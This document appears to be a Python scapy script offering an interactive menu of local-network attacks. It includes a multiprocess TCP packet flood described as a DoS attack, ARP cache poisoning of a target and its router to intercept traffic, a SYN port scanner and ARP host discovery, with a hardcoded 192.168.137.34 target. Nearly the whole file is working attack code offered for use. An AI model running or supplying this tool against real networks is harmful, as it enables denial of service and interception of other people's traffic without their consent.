from scapy.all import *
from multiprocessing import Process, Event
import time
import netifaces
import ipaddress

def dos(target_ip: str, stop_event) -> None:
    """Performs a DoS attack by sending TCP packets continuously."""
    while not stop_event.is_set():
        try:
            send(IP(dst=target_ip) / TCP(sport=1234, dport=1234), verbose=False)
        except Exception as e:
            print(f"An error occurred: {e}")

def arp_spoof(target_ip: str, router_ip: str, stop_event) -> None:
    """Performs ARP spoofing by poisoning the target's ARP cache."""
    target_mac = getmacbyip(target_ip)
    router_mac = getmacbyip(router_ip)

    if target_mac is None:
        print(f"Could not find MAC address for IP: {target_ip}")
        return
    if router_mac is None:
        print(f"Could not find MAC address for IP: {router_ip}")
        return
    while not stop_event.is_set():
        sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=router_ip, hwdst=target_mac), verbose=False)
        sendp(Ether(dst=router_mac)/ARP(op=2, pdst=router_ip, psrc=target_ip, hwdst=router_mac), verbose=False)
        time.sleep(2)

def port_scan(target_ip: str, start_port: int, end_port: int) -> None:
    """Scans a target IP for open ports using TCP SYN scanning."""
    print(f"Scanning {target_ip} from port {start_port} to {end_port}...")
    for port in range(start_port, end_port + 1):
        pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")  # SYN Packet
        ans, _ = sr(pkt, timeout=1, verbose=False)
        for sent, received in ans:
            if received.haslayer(TCP) and received[TCP].flags == 0x12:  # SYN-ACK response
                print(f"[+] Port {port} is open.")

def get_available_networks() -> list:
    """Lists available networks based on active interfaces."""
    networks = []
    for iface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            for link in addrs[netifaces.AF_INET]:
                if 'addr' in link and 'netmask' in link:
                    ip = link['addr']
                    if ip == "127.0.0.1":
                        networks.append("Loopback")
                        continue
                    netmask = link['netmask']
                    network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
                    networks.append(str(network))
    return networks
def get_network_from_ip(target_ip: str) -> str:
    """Finds the network CIDR block that contains the target IP."""
    for iface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            for link in addrs[netifaces.AF_INET]:
                ip = link.get('addr')
                netmask = link.get('netmask')
                if ip and netmask:
                    network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
                    if ipaddress.IPv4Address(target_ip) in network:
                        return str(network)
    return None
def scan_network(target: str, network_cache: dict) -> str:
    """Scans a network for active devices and finds the router IP."""
    
    # If the target is a single IP, determine its network
    try:
        if '/' not in target:  # If it's an IP, get the network
            network = get_network_from_ip(target)
        else:  # If it's already a CIDR network, use it directly
            network = target
    except ValueError:
        print(f"Invalid IP or network format: {target}")
        return None

    if not network:
        print(f"Could not determine the network for target: {target}")
        return None

    print(f"Scanning network {network}...")
    try:
        ans, _ = arping(network, verbose=False)
        for sent, received in ans:
            print(f"Found device -> IP: {received.psrc} MAC: {received.hwsrc}")
    except Exception as e:
        print(f"ARP scan failed: {e}")
        return None

    # Use cached router IP if available
    if network in network_cache:
        router_ip = network_cache[network]
        print(f"Router IP (cached) for network {network}: {router_ip}")
    else:
        gateways = netifaces.gateways()
        router_ip = gateways.get(netifaces.AF_INET, [[None]])[0][0]
        if router_ip:
            print(f"Detected Router IP: {router_ip}")
            network_cache[network] = router_ip
        else:
            print(f"Router IP for network {network} not found.")

    return network


def start_attack(attack_func, target, *args, stop_event, num_processes=1):
    """Starts an attack with multiprocessing and a stop mechanism."""
    if input(f"You are about to start an attack on {target}. Press Enter to continue or any other key to cancel: ") == "":
        stop_event.clear()
        processes = [Process(target=attack_func, args=(target, *args, stop_event)) for _ in range(num_processes)]

        for process in processes:
            process.start()

        input("Press Enter to stop the attack...")
        stop_event.set()

        for process in processes:
            process.terminate()
            process.join()

        print("Attack stopped.")

if __name__ == "__main__":
    stop_event = Event()
    target = "192.168.137.34"
    network_cache = {}

    while True:
        choice = input("\nChoose an option:\n1: Attacks\n2: Change Target IP\n3: Scan Network\n4: Port Scan\n5: Exit\n> ")
        match choice:
            case "1":
                attack_choice = input("Select attack:\n1: DoS\n2: ARP Spoofing\n3: Back\n> ")
                match attack_choice:
                    case "1":
                        num_processes = int(input("Enter number of processes (recommended <50): ") or "10")
                        start_attack(dos, target, stop_event=stop_event, num_processes=num_processes)
                    case "2":
                        network = scan_network(target, network_cache)
                        if network and network in network_cache:
                            router_ip = network_cache[network]
                            start_attack(arp_spoof, target, router_ip, stop_event=stop_event)
                        else:
                            print(f"Router IP for network {network} not found in cache. Please scan the network first.")
                    case "3":
                        continue
                    case _:
                        print("Invalid choice.")
            case "2":
                target = input("Enter the new target IP: ")
                print(f"Target IP changed to {target}")
            case "3":
                print("\nAvailable Networks:")
                networks = get_available_networks()
                if not networks:
                    print("No available networks found.")
                else:
                    for i, net in enumerate(networks, 1):
                        print(f"{i}: {net}")

                    net_choice = int(input("Select a network to scan (Enter number): ") or "1") - 1
                    if 0 <= net_choice < len(networks):
                        scan_network(networks[net_choice], network_cache)
                    else:
                        print("Invalid selection.")
            case "4":
                start_port = int(input("Enter start port (default 1): ") or "1")
                end_port = int(input("Enter end port (default 1024): ") or "1024")
                port_scan(target, start_port, end_port)
            case "5":
                print("Exiting...")
                break
            case _:
                print("Invalid input. Try again.")
